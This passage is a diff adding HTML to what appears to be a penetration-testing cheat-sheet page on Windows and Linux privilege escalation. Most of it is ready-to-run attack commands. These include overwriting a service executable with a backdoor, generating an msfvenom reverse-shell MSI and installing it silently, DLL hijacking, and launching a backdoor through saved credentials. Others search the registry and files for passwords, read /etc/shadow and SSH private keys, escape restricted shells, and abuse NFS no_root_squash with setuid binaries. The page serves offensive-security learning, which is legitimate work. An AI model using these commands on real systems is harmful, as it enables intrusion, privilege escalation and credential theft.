+                    <pre><code># FILE_ALL_ACCESS</code></pre>
+
+                    <h3>Exploit the Permissions</h3>
+                    <div class="tool-command">Backup Original Executable:</div>
+                    <pre><code>copy "C:\Program Files\Heisenburg\knocks.exe" C:\Temp\</code></pre>
+
+                    <div class="tool-command">Create Reverse Shell Binary and Overwrite Existing File:</div>
+                    <pre><code>copy /Y C:\Temp\backdoor.exe "C:\Program Files\Heisenburg\knocks.exe"</code></pre>
+
+                    <div class="tool-command">Start Netcat Listener and Service:</div>
+                    <pre><code>net start "heisenburgsvc"</code></pre>
+                    <pre><code># net stop "heisenburgsvc" first if the service is already running.</code></pre>
+                </div>
+            </div>
+            <!-- AlwaysInstallElevated Privilege Escalation Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('always-install-elevated')">AlwaysInstallElevated Privilege Escalation</div>
+                <div class="tool-details" id="always-install-elevated">
+                    <h3>Check AlwaysInstallElevated Registry Values</h3>
+                    <div class="tool-command">Verify if both registry keys contain "AlwaysInstallElevated" value 0x1:</div>
+                    <pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
+                    <pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
+
+                    <h3>Exploit AlwaysInstallElevated</h3>
+                    <div class="tool-command">Generate Reverse Shell MSI Payload:</div>
+                    <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;MY-IP&gt; LPORT=&lt;MY-PORT&gt; -f msi -o shell.msi</code></pre>
+
+                    <div class="tool-command">Copy the Binary Over to Target, Start a Listener, and Execute:</div>
+                    <pre><code>msiexec /quiet /qn /i C:\Temp\shell.msi</code></pre>
+                </div>
+            </div>
+            <!-- DLL Hijacking Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('dll-hijacking')">DLL Hijacking</div>
+                <div class="tool-details" id="dll-hijacking">
+                    <h3>Understanding DLL Search Order</h3>
+                    <p>You can see the DLL search order on 32-bit systems below:</p>
+                    <ol>
+                        <li>The directory from which the application loaded</li>
+                        <li>32-bit System directory (C:\Windows\System32)</li>
+                        <li>16-bit System directory (C:\Windows\System)</li>
+                        <li>Windows directory (C:\Windows)</li>
+                        <li>The current working directory (CWD)</li>
+                        <li>Directories in the PATH environment variable (system then user)</li>
+                    </ol>
+                    <p>As a low privilege user, we have little hope of putting a malicious DLL in directories 1-4. Directory 5 is not a possibility in this case because we are dealing with a Windows service, but if we have write access to any of the directories in the Windows PATH, we can exploit this.</p>
+
+                    <h3>Check Path Environment Variable</h3>
+                    <div class="tool-command">Check the PATH environment variable:</div>
+                    <pre><code>echo %path%</code></pre>
+
+                    <h3>Check Access Permissions</h3>
+                    <div class="tool-command">Check access permissions with accesschk or cacls:</div>
+                    <pre><code>accesschk.exe -dqv "C:\Python27"</code></pre>
+                    <pre><code>cacls "C:\Python27"</code></pre>
+
+                    <h3>Exploit DLL Hijacking</h3>
+                    <div class="tool-command">Check the status of the IKEEXT service to ensure it is set to AUTO_START:</div>
+                    <pre><code>sc qc IKEEXT</code></pre>
+                    
+                    <div class="tool-command">Copy the malicious DLL and restart the service:</div>
+                    <pre><code>copy evil.dll C:\Python27\wlbsctrl.dll</code></pre>
+                    <pre><code>Restart</code></pre>
+                </div>
+            </div>
+            <!-- Stored Credentials Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('stored-credentials')">Stored Credentials</div>
+                <div class="tool-details" id="stored-credentials">
+                    <h3>Check for Saved Credentials</h3>
+                    <div class="tool-command">List saved credentials:</div>
+                    <pre><code>cmdkey /list</code></pre>
+
+                    <h3>Use Saved Credentials</h3>
+                    <div class="tool-command">If saved credentials exist, use <code>runas</code> to execute as that user:</div>
+                    <pre><code>runas /savedcred /user:&lt;USERNAME-OF-SAVED-CRED&gt; C:\Temp\backdoor.exe</code></pre>
+                </div>
+            </div>
+            <!-- Get Passwords from Windows Registry Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('registry-passwords')">Get Passwords from Windows Registry</div>
+                <div class="tool-details" id="registry-passwords">
+                    <h3>Autologon Credentials</h3>
+                    <div class="tool-command">Retrieve autologon credentials:</div>
+                    <pre><code>Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"</code></pre>
+                    <div class="tool-command">Alternatively, use:</div>
+                    <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</code></pre>
+
+                    <h3>VNC Password</h3>
+                    <div class="tool-command">Retrieve VNC password:</div>
+                    <pre><code>reg query "HKCU\Software\ORL\WinVNC3\Password"</code></pre>
+
+                    <h3>SNMP Parameters</h3>
+                    <div class="tool-command">Retrieve SNMP parameters:</div>
+                    <pre><code>reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</code></pre>
+
+                    <h3>Putty Sessions</h3>
+                    <div class="tool-command">Retrieve Putty session information:</div>
+                    <pre><code>reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"</code></pre>
+                </div>
+            </div>
+            <!-- Search for Password in Registry Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('search-registry-passwords')">Search for Password in Registry</div>
+                <div class="tool-details" id="search-registry-passwords">
+                    <h3>Search for Passwords in Registry</h3>
+                    <div class="tool-command">Search for passwords in HKLM (HKEY_LOCAL_MACHINE):</div>
+                    <pre><code>reg query HKLM /f password /t REG_SZ /s</code></pre>
+
+                    <div class="tool-command">Search for passwords in HKCU (HKEY_CURRENT_USER):</div>
+                    <pre><code>reg query HKCU /f password /t REG_SZ /s</code></pre>
+                </div>
+            </div>
+            <!-- Files That May Contain Passwords Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('files-passwords')">Files That May Contain Passwords</div>
+                <div class="tool-details" id="files-passwords">
+                    <h3>Files That May Contain Passwords</h3>
+                    <div class="tool-command">Common Locations:</div>
+                    <pre><code>c:\sysprep.inf</code></pre>
+                    <pre><code>c:\sysprep\sysprep.xml</code></pre>
+                    <pre><code>%WINDIR%\Panther\Unattend\Unattended.xml</code></pre>
+                    <pre><code>%WINDIR%\Panther\Unattended.xml</code></pre>
+
+                    <div class="tool-command">Domain Controller Symbol Policy Files:</div>
+                    <pre><code>%SYSTEMROOT%\SYSVOL\sysvol</code></pre>
+                    <pre><code>\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\</code></pre>
+
+                    <div class="tool-command">Element-Specific Attributes in XML Files:</div>
+                    <pre><code>Services\Services.xml: Element-Specific Attributes</code></pre>
+                    <pre><code>ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</code></pre>
+                    <pre><code>Printers\Printers.xml: SharedPrinter Element</code></pre>
+                    <pre><code>Drives\Drives.xml: Element-Specific Attributes</code></pre>
+                    <pre><code>DataSources\DataSources.xml: Element-Specific Attributes</code></pre>
+                </div>
+            </div>
+            <!-- Weak Folder Permissions Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('weak-folder-permissions')">Weak Folder Permissions</div>
+                <div class="tool-details" id="weak-folder-permissions">
+                    <h3>Find All Weak Folder Permissions Per Drive</h3>
+                    <div class="tool-command">Check permissions for Users group:</div>
+                    <pre><code>accesschk.exe -uwdqs Users c:\</code></pre>
+
+                    <div class="tool-command">Check permissions for Authenticated Users group:</div>
+                    <pre><code>accesschk.exe -uwdqs "Authenticated Users" c:\</code></pre>
+                </div>
+            </div>
+            <!-- Weak File Permissions Content -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('weak-file-permissions')">Weak File Permissions</div>
+                <div class="tool-details" id="weak-file-permissions">
+                    <h3>Find All Weak File Permissions Per Drive</h3>
+                    <div class="tool-command">Check permissions for Users group on all files:</div>
+                    <pre><code>accesschk.exe -uwqs Users c:\*.*</code></pre>
+
+                    <div class="tool-command">Check permissions for Authenticated Users group on all files:</div>
+                    <pre><code>accesschk.exe -uwqs "Authenticated Users" c:\*.*</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Linux PrivEsc Content -->
+        <div id="linuxprivesc" class="tab-content">
+            <h1>Linux Privilege Escalation</h1>
+            <!-- Enumeration Commands -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-enumeration')">Enumeration</div>
+                <div class="tool-details" id="linux-enumeration">
+                    <div class="tool-command">hostname: <code>hostname</code></div>
+                    <p>Lists the name of the host.</p>
+                    <div class="tool-command">uname -a: <code>uname -a</code></div>
+                    <p>Prints kernel information.</p>
+                    <div class="tool-command">cat /proc/version: <code>cat /proc/version</code></div>
+                    <p>Prints kernel version and GCC version.</p>
+                    <div class="tool-command">cat /etc/issue: <code>cat /etc/issue</code></div>
+                    <p>Displays exact version of the OS.</p>
+                    <div class="tool-command">ps: <code>ps</code></div>
+                    <p>Lists running processes.</p>
+                    <div class="tool-command">ps -A: <code>ps -A</code></div>
+                    <p>Lists all running processes.</p>
+                    <div class="tool-command">ps axjf: <code>ps axjf</code></div>
+                    <p>Displays process tree.</p>
+                    <div class="tool-command">ps aux: <code>ps aux</code></div>
+                    <p>Displays processes with users.</p>
+                    <div class="tool-command">env: <code>env</code></div>
+                    <p>Shows all environment variables.</p>
+                    <div class="tool-command">sudo -l: <code>sudo -l</code></div>
+                    <p>Lists commands that any user can run as root without a password.</p>
+                    <div class="tool-command">groups: <code>groups</code></div>
+                    <p>Lists the groups that the current user is in.</p>
+                    <div class="tool-command">id: <code>id</code></div>
+                    <p>Lists IDs of the user and group.</p>
+                    <div class="tool-command">cat /etc/passwd: <code>cat /etc/passwd</code></div>
+                    <p>Displays all users.</p>
+                    <div class="tool-command">cat /etc/passwd | cut -d ":" -f 1: <code>cat /etc/passwd | cut -d ":" -f 1</code></div>
+                    <p>Removes other information and displays only users.</p>
+                    <div class="tool-command">ls /home: <code>ls /home</code></div>
+                    <p>Displays user directories.</p>
+                    <div class="tool-command">history: <code>history</code></div>
+                    <p>Shows previously run commands, which might contain sensitive information.</p>
+                    <div class="tool-command">ifconfig / ip a / ip route: <code>ifconfig</code> or <code>ip a</code> or <code>ip route</code></div>
+                    <p>Displays network-related information.</p>
+                    <div class="tool-command">netstat: <code>netstat</code></div>
+                    <p>Displays network route.</p>
+                    <div class="tool-command">netstat -a: <code>netstat -a</code></div>
+                    <p>Shows all listening and established connections.</p>
+                    <div class="tool-command">netstat -at: <code>netstat -at</code></div>
+                    <p>Displays TCP connections.</p>
+                    <div class="tool-command">netstat -au: <code>netstat -au</code></div>
+                    <p>Displays UDP connections.</p>
+                    <div class="tool-command">netstat -l: <code>netstat -l</code></div>
+                    <p>Displays listening connections.</p>
+                    <div class="tool-command">netstat -s: <code>netstat -s</code></div>
+                    <p>Shows network statistics.</p>
+                    <div class="tool-command">netstat -tp: <code>netstat -tp</code></div>
+                    <p>Displays connections with service name and PID. Add "l" for only listening ports.</p>
+                    <div class="tool-command">netstat -i: <code>netstat -i</code></div>
+                    <p>Displays interface-related information.</p>
+                    <div class="tool-command">find: <code>find</code></div>
+                    <p>Helps in locating files and directories. Examples:</p>
+                    <ul>
+                        <li><code>find . -name flag1.txt</code> - Find "flag1.txt" in the current directory.</li>
+                        <li><code>find /home -name flag1.txt</code> - Find "flag1.txt" in the /home directory.</li>
+                        <li><code>find / -type d -name config</code> - Find directory named "config".</li>
+                        <li><code>find / -type f -perm 0777</code> - Find files with 777 permissions.</li>
+                        <li><code>find / -perm a=x</code> - Find executable files.</li>
+                        <li><code>find /home -user frank</code> - Find files for user "frank" under "/home".</li>
+                        <li><code>find / -mtime 10</code> - Find files modified in the last 10 days.</li>
+                        <li><code>find / -atime 10</code> - Find files accessed in the last 10 days.</li>
+                        <li><code>find / -cmin -60</code> - Find files changed within the last hour.</li>
+                        <li><code>find / -amin -60</code> - Find files accessed within the last hour.</li>
+                        <li><code>find / -size 50M</code> - Find files with 50 MB size.</li>
+                        <li><code>find / -writable -type d 2>/dev/null</code> - Find world-writable directories.</li>
+                        <li><code>find / -perm -222 -type d 2>/dev/null</code> - Find world-writable folders.</li>
+                        <li><code>find / -perm -o w -type d 2>/dev/null</code> - Find world-writable folders.</li>
+                        <li><code>find / -perm -o x -type d 2>/dev/null</code> - Find world-executable folders.</li>
+                        <li><code>find / -name perl*</code> - Find files related to Perl.</li>
+                        <li><code>find / -name python*</code> - Find files related to Python.</li>
+                        <li><code>find / -name gcc*</code> - Find files related to GCC.</li>
+                        <li><code>find / -perm -u=s -type f 2>/dev/null</code> - Find files with SUID bit.</li>
+                    </ul>
+                </div>
+            </div>
+            <!-- Automated Enumeration Scripts -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-auto-enum')">Automated Enumeration Scripts</div>
+                <div class="tool-details" id="linux-auto-enum">
+                    <p>In real-life scenarios, we often don’t have much time for manual enumeration. Instead, we can use some powerful automated scripts to streamline the process:</p>
+                    <ul id="automated-enum">
+                        <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank">LinPeas</a></li>
+                        <li><a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a></li>
+                        <li><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank">LES (Linux Exploit Suggester)</a></li>
+                        <li><a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">Linux Smart Enumeration</a></li>
+                        <li><a href="https://github.com/linted/linuxprivchecker" target="_blank">Linux Priv Checker</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-kernel-exploits')">Linux Kernel Exploits</div>
+                <div class="tool-details" id="linux-kernel-exploits">
+                    <p>After finding the version of the kernel, you can search for an appropriate exploit. Tools like “Linux Exploit Suggester” can assist in finding suitable exploits.</p>
+                    <p>Once you have the exploit, transfer the payload from your machine to the target machine, execute it, and you should gain higher privileges.</p>
+                    <p>For example, using an overlayfs exploit successfully resulted in elevated privileges.</p>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-sudo')">Sudo</div>
+                <div class="tool-details" id="linux-sudo">
+                    <p>One of the first steps when you gain access to a machine is to run <code>sudo -l</code>. This command lists all the files you can run as root without needing a password.</p>
+                    <p>If you find any executable that you can run, visit <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> to check if the specified program is a system program or if you can modify it with <code>/bin/sh</code> to gain a shell.</p>
+                    <p>GTFOBins can be a lifesaver in these situations!</p>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-suid')">SUID (Set owner User ID)</div>
+                <div class="tool-details" id="linux-suid">
+                    <p>SUID is a permission that allows specific files to be run with the privileges of the file's owner, usually root. This can be very useful for privilege escalation.</p>
+                    <p>To find all SUID files, use the command:</p>
+                    <div class="tool-command"><code>find / -perm -u=s -type f 2>/dev/null</code></div>
+                    <p>After listing the SUID files, search for potential exploits or methods to bypass the permissions on <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>.</p>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-capabilities')">Capabilities</div>
+                <div class="tool-details" id="linux-capabilities">
+                    <p>Capabilities are similar to SUID but provide a subset of root privileges to a process or a binary, rather than full root access.</p>
+                    <p>To list all binaries with capabilities, use the command:</p>
+                    <div class="tool-command"><code>getcap -r / 2>/dev/null</code></div>
+                    <p>Find the binaries with capabilities and check them on <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> for functions related to capabilities. Try the suggested methods to see if any work for privilege escalation.</p>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-cron-jobs')">Cron Jobs</div>
+                <div class="tool-details" id="linux-cron-jobs">
+                    <p>Cron jobs are used for scheduling tasks to run automatically at specified intervals. By default, they run with the privileges of the owner of the cron job.</p>
+                    <p>To view the crontab configuration, use:</p>
+                    <div class="tool-command"><code>cat /etc/crontab</code></div>
+                    <p>Check the cron jobs listed. If you have permission to edit any of them, you can modify the job to execute a reverse shell or another payload. Monitor your listener to catch the reverse shell when the cron job runs.</p>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-path')">PATH</div>
+                <div class="tool-details" id="linux-path">
+                    <p>The PATH environment variable specifies the directories where executable files are located. When you run a command without specifying its full path, the system searches the directories listed in PATH to find the executable.</p>
+                    <p>To view the current PATH, use:</p>
+                    <div class="tool-command"><code>echo $PATH</code></div>
+                    <p>The output will be a colon-separated list of directories, such as:</p>
+                    <div class="tool-command"><code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></div>
+                    <p>If you find writable directories in PATH, you can place a malicious script or binary there. To find writable paths, use:</p>
+                    <div class="tool-command"><code>find / -writable 2>/dev/null</code></div>
+                    <p>For example, if you discover a writable path where a script called "thm" exists, and you can run it as ROOT, you can create a binary that executes a shell:</p>
+                    <div class="tool-command"><code>echo "/bin/bash" > thm</code></div>
+                    <p>Make it executable:</p>
+                    <div class="tool-command"><code>chmod +x thm</code></div>
+                    <p>Add the directory to PATH:</p>
+                    <div class="tool-command"><code>export PATH=<new-path>:$PATH</code></div>
+                    <p>Now, when you run the binary, it will execute with root privileges if the script is located in the writable path and is executable.</p>
+                </div>
+            </div>
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('linux-nfs')">NFS (Network File Sharing)</div>
+                <div class="tool-details" id="linux-nfs">
+                    <p>To view the NFS (Network File System) configuration, use:</p>
+                    <div class="tool-command"><code>cat /etc/exports</code></div>
+                    <p>Alternatively, you can find mountable shares from your machine with:</p>
+                    <div class="tool-command"><code>showmount -e &lt;target IP&gt;</code></div>
+                    <p>Look for directories with the <code>no_root_squash</code> option, which means the share is writable and can be exploited for privilege escalation.</p>
+                    <p>Once you've identified writable shares, create a directory on your attacker machine (e.g., <code>/tmp</code>), and mount the target share:</p>
+                    <div class="tool-command"><code>mount -o rw &lt;targetIP&gt;:&lt;share-location&gt; &lt;directory path we created&gt;</code></div>
+                    <p>Navigate to the mounted directory and create a binary that grants root privileges:</p>
+                    <div class="tool-command"><code>echo "/bin/bash" &gt; <binary></code></div>
+                    <p>Make the binary executable and set the setuid bit to grant root privileges:</p>
+                    <div class="tool-command"><code>chmod +x <binary></code></div>
+                    <div class="tool-command"><code>chmod +s <binary></code></div>
+                    <p>Go back to the target machine, navigate to the mounted share, and execute the binary to get root privileges.</p>
+                </div>
+            </div>  
+            <div class="tool-name" onclick="toggleDetails('linux-notes')">Notes on Linux Privilege Escalation</div>
+            <div class="tool-details" id="linux-notes">
+                <p><strong>Enumeration is the key.</strong></p>
+                <p>Linux privilege escalation is all about:</p>
+                <ul class="notes-list">
+                    <li><strong>Collect</strong> - Enumeration, more enumeration and some more enumeration.</li>
+                    <li><strong>Process</strong> - Sort through data, analyze, and prioritize.</li>
+                    <li><strong>Search</strong> - Know what to search for and where to find the exploit code.</li>
+                    <li><strong>Adapt</strong> - Customize the exploit, so it fits. Not every exploit works for every system "out of the box".</li>
+                    <li><strong>Try</strong> - Get ready for (lots of) trial and error.</li>
+                </ul>
+                <h2>Operating System</h2>
+                <ul>
+                    <li><strong>What's the distribution type? What version?</strong></li>
+                    <li><code>cat /etc/issue</code></li>
+                    <li><code>cat /etc/*-release</code></li>
+                    <li><code>cat /etc/lsb-release</code></li>
+                    <li><code>cat /etc/redhat-release</code></li>
+                </ul>
+                <ul>
+                    <li><strong>What's the Kernel version? Is it 64-bit?</strong></li>
+                    <li><code>cat /proc/version</code></li>
+                    <li><code>uname -a</code></li>
+                    <li><code>uname -mrs</code></li>
+                    <li><code>rpm -q kernel</code></li>
+                    <li><code>dmesg | grep Linux</code></li>
+                    <li><code>ls /boot | grep vmlinuz-</code></li>
+                </ul>
+                <ul>
+                    <li><strong>What can be learnt from the environmental variables?</strong></li>
+                    <li><code>cat /etc/profile</code></li>
+                    <li><code>cat /etc/bashrc</code></li>
+                    <li><code>cat ~/.bash_profile</code></li>
+                    <li><code>cat ~/.bashrc</code></li>
+                    <li><code>cat ~/.bash_logout</code></li>
+                    <li><code>env</code></li>
+                    <li><code>set</code></li>
+                </ul>
+                <ul>
+                    <li><strong>Is there a printer?</strong></li>
+                    <li><code>lpstat -a</code></li>
+                </ul>
+                <h2>Applications & Services</h2>
+                <ul>
+                    <li><strong>What services are running? Which service has which user privilege?</strong></li>
+                    <li><code>ps aux</code></li>
+                    <li><code>ps -ef</code></li>
+                    <li><code>top</code></li>
+                    <li><code>cat /etc/service</code></li>
+                </ul>
+                <ul>
+                    <li><strong>Which service(s) are being run by root? Of these services, which are vulnerable - it's worth a double check!</strong></li>
+                    <li><code>ps aux | grep root</code></li>
+                    <li><code>ps -ef | grep root</code></li>
+                </ul>
+                <ul>
+                    <li><strong>What applications are installed? What version are they? Are they currently running?</strong></li>
+                    <li><code>ls -alh /usr/bin/</code></li>
+                    <li><code>ls -alh /sbin/</code></li>
+                    <li><code>dpkg -l</code></li>
+                    <li><code>rpm -qa</code></li>
+                    <li><code>ls -alh /var/cache/apt/archives</code></li>
+                    <li><code>ls -alh /var/cache/yum/</code></li>
+                </ul>
+                <ul>
+                    <li><strong>Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?</strong></li>
+                    <li><code>cat /etc/syslog.conf</code></li>
+                    <li><code>cat /etc/chttp.conf</code></li>
+                    <li><code>cat /etc/lighttpd.conf</code></li>
+                    <li><code>cat /etc/cups/cupsd.conf</code></li>
+                    <li><code>cat /etc/inetd.conf</code></li>
+                    <li><code>cat /etc/apache2/apache2.conf</code></li>
+                    <li><code>cat /etc/my.conf</code></li>
+                    <li><code>cat /etc/httpd/conf/httpd.conf</code></li>
+                    <li><code>cat /opt/lampp/etc/httpd.conf</code></li>
+                    <li><code>ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'</code></li>
+                </ul>
+                <ul>
+                    <li><strong>What jobs are scheduled?</strong></li>
+                    <li><code>crontab -l</code></li>
+                    <li><code>ls -alh /var/spool/cron</code></li>
+                    <li><code>ls -al /etc/ | grep cron</code></li>
+                    <li><code>ls -al /etc/cron*</code></li>
+                    <li><code>cat /etc/cron*</code></li>
+                    <li><code>cat /etc/at.allow</code></li>
+                    <li><code>cat /etc/at.deny</code></li>
+                    <li><code>cat /etc/cron.allow</code></li>
+                    <li><code>cat /etc/cron.deny</code></li>
+                    <li><code>cat /etc/crontab</code></li>
+                    <li><code>cat /etc/anacrontab</code></li>
+                    <li><code>cat /var/spool/cron/crontabs/root</code></li>
+                </ul>
+                <h3>Confidential Information & Users</h3>
+                <p><strong>Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?</strong></p>
+                <ul>
+                    <li><code>id</code></li>
+                    <li><code>who</code></li>
+                    <li><code>w</code></li>
+                    <li><code>last</code></li>
+                    <li><code>cat /etc/passwd | cut -d:</code> # List of users</li>
+                    <li><code>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'</code> # List of super users</li>
+                    <li><code>awk -F: '($3 == "0") {print}' /etc/passwd</code> # List of super users</li>
+                    <li><code>cat /etc/sudoers</code></li>
+                    <li><code>sudo -l</code></li>
+                </ul>
+
+                <h3>What sensitive files can be found?</h3>
+                <ul>
+                    <li><code>cat /etc/passwd</code></li>
+                    <li><code>cat /etc/group</code></li>
+                    <li><code>cat /etc/shadow</code></li>
+                    <li><code>ls -alh /var/mail/</code></li>
+                </ul>
+
+                <h3>Anything "interesting" in the home directorie(s)?</h3>
+                <ul>
+                    <li><code>ls -ahlR /root/</code></li>
+                    <li><code>ls -ahlR /home/</code></li>
+                </ul>
+
+                <h3>Are there any passwords in scripts, databases, configuration files, or log files?</h3>
+                <ul>
+                    <li><code>cat /var/apache2/config.inc</code></li>
+                    <li><code>cat /var/lib/mysql/mysql/user.MYD</code></li>
+                    <li><code>cat /root/anaconda-ks.cfg</code></li>
+                </ul>
+
+                <h3>What has the user been doing? Any password in plain text?</h3>
+                <ul>
+                    <li><code>cat ~/.bash_history</code></li>
+                    <li><code>cat ~/.nano_history</code></li>
+                    <li><code>cat ~/.atftp_history</code></li>
+                    <li><code>cat ~/.mysql_history</code></li>
+                    <li><code>cat ~/.php_history</code></li>
+                </ul>
+
+                <h3>What user information can be found?</h3>
+                <ul>
+                    <li><code>cat ~/.bashrc</code></li>
+                    <li><code>cat ~/.profile</code></li>
+                    <li><code>cat /var/mail/root</code></li>
+                    <li><code>cat /var/spool/mail/root</code></li>
+                </ul>
+
+                <h3>Can private-key information be found?</h3>
+                <ul>
+                    <li><code>cat ~/.ssh/authorized_keys</code></li>
+                    <li><code>cat ~/.ssh/identity.pub</code></li>
+                    <li><code>cat ~/.ssh/identity</code></li>
+                    <li><code>cat ~/.ssh/id_rsa.pub</code></li>
+                    <li><code>cat ~/.ssh/id_rsa</code></li>
+                    <li><code>cat ~/.ssh/id_dsa.pub</code></li>
+                    <li><code>cat ~/.ssh/id_dsa</code></li>
+                    <li><code>cat /etc/ssh/ssh_config</code></li>
+                    <li><code>cat /etc/ssh/sshd_config</code></li>
+                    <li><code>cat /etc/ssh/ssh_host_dsa_key.pub</code></li>
+                    <li><code>cat /etc/ssh/ssh_host_dsa_key</code></li>
+                    <li><code>cat /etc/ssh/ssh_host_rsa_key.pub</code></li>
+                    <li><code>cat /etc/ssh/ssh_host_rsa_key</code></li>
+                    <li><code>cat /etc/ssh/ssh_host_key.pub</code></li>
+                    <li><code>cat /etc/ssh/ssh_host_key</code></li>
+                </ul>
+
+                <h3>File Systems</h3>
+                <ul>
+                    <li>Which configuration files can be written in /etc/? Able to reconfigure a service?</li>
+                    <li><code>ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null</code> # Anyone</li>
+                    <li><code>ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null</code> # Owner</li>
+                    <li><code>ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null</code> # Group</li>
+                    <li><code>ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null</code> # Other</li>
+                    <li><code>find /etc/ -readable -type f 2>/dev/null</code> # Anyone</li>
+                    <li><code>find /etc/ -readable -type f -maxdepth 1 2>/dev/null</code> # Anyone</li>
+                </ul>
+
+                <h3>If commands are limited, can you break out of the "jail" shell?</h3>
+                <ul>
+                    <li><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></li>
+                    <li><code>echo os.system('/bin/bash')</code></li>
+                    <li><code>/bin/sh -i</code></li>
+                </ul>
+
+                <h3>How are file-systems mounted?</h3>
+                <ul>
+                    <li><code>mount</code></li>
+                    <li><code>df -h</code></li>
+                </ul>
+
+                <h3>Are there any unmounted file-systems?</h3>
+                <ul>
+                    <li><code>cat /etc/fstab</code></li>
+                </ul>
+
+                <h3>What "Advanced Linux File Permissions" are used? Sticky bits, SUID &amp; GUID</h3>
+                <ul>
+                    <li><code>find / -perm -1000 -type d 2>/dev/null</code> # Sticky bit</li>
+                    <li><code>find / -perm -g=s -type f 2>/dev/null</code> # SGID</li>
+                    <li><code>find / -perm -u=s -type f 2>/dev/null</code> # SUID</li>
+                    <li><code>find / -perm -g=s -o -perm -u=s -type f 2>/dev/null</code> # SGID or SUID</li>
+                    <li><code>for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done</code> # Search common *bin places</li>
+                    <li><code>find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null</code> # Find SGID/SUID files</li>
+                </ul>
+
+                <h3>Where can files be written to and executed from?</h3>
+                <ul>
+                    <li><code>find / -writable -type d 2>/dev/null</code> # World-writeable folders</li>
+                    <li><code>find / -perm -222 -type d 2>/dev/null</code> # World-writeable folders</li>
+                    <li><code>find / -perm -o+w -type d 2>/dev/null</code> # World-writeable folders</li>
+                    <li><code>find / -perm -o+x -type d 2>/dev/null</code> # World-executable folders</li>
+                    <li><code>find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null</code> # World-writeable & executable</li>
+                </ul>
+
+                <h3>Any "problem" files? World-writeable, "nobody" files</h3>
+                <ul>
+                    <li><code>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print</code> # World-writeable files</li>
+                    <li><code>find /dir -xdev \( -nouser -o -nogroup \) -print</code> # No-owner files</li>
+                </ul>
+
+                <h3>Preparation & Finding Exploit Code</h3>
+                <ul>
+                    <li>What development tools/languages are installed?</li>
+                    <li><code>find / -name perl*</code></li>
+                    <li><code>find / -name python*</code></li>
+                    <li><code>find / -name gcc*</code></li>
+                    <li><code>find / -name cc</code></li>
+                </ul>
+
+                <h3>How can files be uploaded?</h3>
+                <ul>
+                    <li><code>find / -name wget</code></li>
+                    <li><code>find / -name nc*</code></li>
+                    <li><code>find / -name netcat*</code></li>
+                    <li><code>find / -name tftp*</code></li>
+                    <li><code>find / -name ftp</code></li>
+                </ul>
+
+                <h3>Finding Exploit Code</h3>
+                <ul id="automated-enum">
+                    <li><a href="http://www.exploit-db.com">http://www.exploit-db.com</a></li>
+                    <li><a href="http://1337day.com">http://1337day.com</a></li>
+                    <li><a href="http://www.securiteam.com">http://www.securiteam.com</a></li>
+                    <li><a href="http://www.securityfocus.com">http://www.securityfocus.com</a></li>
+                    <li><a href="http://www.exploitsearch.net">http://www.exploitsearch.net</a></li>
+                    <li><a href="http://metasploit.com/modules/">http://metasploit.com/modules/</a></li>
